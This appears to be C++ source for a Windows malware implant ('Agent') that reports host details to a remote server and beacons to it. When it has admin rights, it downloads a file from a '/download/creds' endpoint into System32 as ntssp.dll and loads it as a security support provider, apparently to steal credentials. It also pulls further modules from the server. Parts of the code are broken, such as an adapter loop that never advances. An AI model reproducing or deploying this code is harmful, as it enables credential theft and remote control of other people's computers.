#define SECURITY_WIN32
#define _WIN32_WINNT 0x500
#include <string>
#include <cstdint>
#include <chrono>
#include <memory>
#include <windows.h>
#include <iphlpapi.h>

#include "Agent.h"
#include "wnetwrap.h"
#include "utils.h"


Agent::Agent(std::string _serverUri) {
    serverUri = _serverUri;
    auto systemInfo = Agent::getSystemInfo();
    CheckNewModules();
    plantSP();

    wrap::HttpsRequest(
        wrap::Url{ serverUri  + "/test2"},
        wrap::Method{ "POST" },
        wrap::Header{ {"X-Client-ID", clientID} },
        wrap::Payload{
        {"isAdmin", std::to_string(systemInfo.isAdmin)},
        {"domainName", systemInfo.ComputerName},
        {"Adapters", "127.0.0.1"},
        {"NetBIOSName", systemInfo.NETBIOSName}
        }
    );

    Ping();
}

SystemInfo Agent::getSystemInfo() {
    struct SystemInfo info{};

    // Check if me have local admin
        SID_IDENTIFIER_AUTHORITY NtAuthority = SECURITY_NT_AUTHORITY;
        PSID AdministratorsGroup;
        auto bResult = AllocateAndInitializeSid(
            &NtAuthority,
            2,
            SECURITY_BUILTIN_DOMAIN_RID,
            DOMAIN_ALIAS_RID_ADMINS,
            0, 0, 0, 0, 0, 0,
            &AdministratorsGroup);
        if (bResult) {
            if (!CheckTokenMembership(NULL, AdministratorsGroup, &bResult)) {
                bResult = false;
            }
            FreeSid(AdministratorsGroup);
        }
        isAdmin = bResult;
        info.isAdmin = isAdmin;


   // Get the computer FQDN
        std::wstring ComputerFQDN;
        ComputerFQDN.resize(BUFSIZ);
        DWORD dwSize = ComputerFQDN.size();

        if (!GetComputerNameExW(ComputerNamePhysicalDnsFullyQualified,
                LPWSTR(ComputerFQDN.c_str()), &dwSize))
        {
            srand(time(0));
            clientID = "Anon" + std::to_string(rand());
        }
        ComputerFQDN.erase(std::find(ComputerFQDN.begin(), ComputerFQDN.end(), '\0'), ComputerFQDN.end());

        auto byteStringFQDN = utils::w2s(ComputerFQDN);
        info.ComputerName = byteStringFQDN;
        clientID = std::to_string(utils::RSHash(byteStringFQDN));
 //Get NETBIOS name

        std::wstring NETBIOSname;
        NETBIOSname.resize(BUFSIZ);
        dwSize = BUFSIZ;

        if (!GetComputerNameExW(ComputerNameNetBIOS, LPWSTR(NETBIOSname.c_str()), &dwSize)) {
            srand(time(0));
            clientID = "Anon" + std::to_string(rand());
        }

        NETBIOSname.erase(std::find(NETBIOSname.begin(), NETBIOSname.end(), '\0'), NETBIOSname.end());
        auto byteStringNETBIOS = utils::w2s(NETBIOSname);
        info.NETBIOSName = byteStringNETBIOS;

  // Get the adapters
        auto pAdapterInfo = std::make_unique<IP_ADAPTER_INFO>();
        std::vector<std::string> adapters;
        DWORD size{};
        if (auto res = GetAdaptersInfo(pAdapterInfo.get(), &size); res == NO_ERROR) {
            auto pAdapter = pAdapterInfo.get();
            while (pAdapter) {
                auto adapterIPAddress = pAdapter -> IpAddressList.IpAddress.String;
                adapters.push_back(adapterIPAddress);
            }
            info.adapters = adapters;
        }
        return info;
}

bool Agent::wasDeployed() {
    return _waccess(L"C:\\Windows\\System32\\ntssp.dll", 0) == 0;
}

bool Agent::plantSP() {
    if (!isAdmin) { return false;  }

    std::string loadSPPath = "C:\\Windows\\System32\\ntssp.dll";
    auto response = wrap::HttpsRequest(
        wrap::Url{serverUri + "/download/creds"},
        wrap::Method{ "GET" },
        wrap::Header{ {"X-Client-ID", clientID} },
        wrap::Download{ loadSPPath }
        );
   std::cout << utils::LoadSP(loadSPPath);
   return true;
}


std::vector<std::string> Agent::CheckNewModules() {
    auto response = wrap::HttpsRequest(
        wrap::Url{serverUri + "/available_modules"},
        wrap::Method{ "GET" },
        wrap::Header{ {"X-Client-ID", clientID}}
    );
    auto responseText = response.raw;;
    auto stripped = response.raw.substr(1, response.raw.length() - 2);
    return utils::split(stripped, ",");
}

std::string Agent::DownloadModule(const std::string& moduleEndpoint) {
    auto response = wrap::HttpsRequest(
        wrap::Method{ "GET"},
        wrap::Url{ serverUri + moduleEndpoint},
        wrap::Header{ {"X-Client-Id", clientID}}
    );
    if (response.status_code != "404" && response.downloaded_bytes > 0x100) {
        return response.raw;
    }
    return "";
}


void Agent::Ping() {
	auto currentTime{
		std::chrono::duration_cast<std::chrono::microseconds>(
			std::chrono::system_clock::now().time_since_epoch()).count()
	};
    wrap::HttpsRequest(
        wrap::Url{ serverUri + "/test3" },
        wrap::Method{ "POST" }, 
        wrap::Body{
            std::to_string(currentTime)
		},
		wrap::Header {
			{"X-Client-Id", clientID}
		}
	);
} 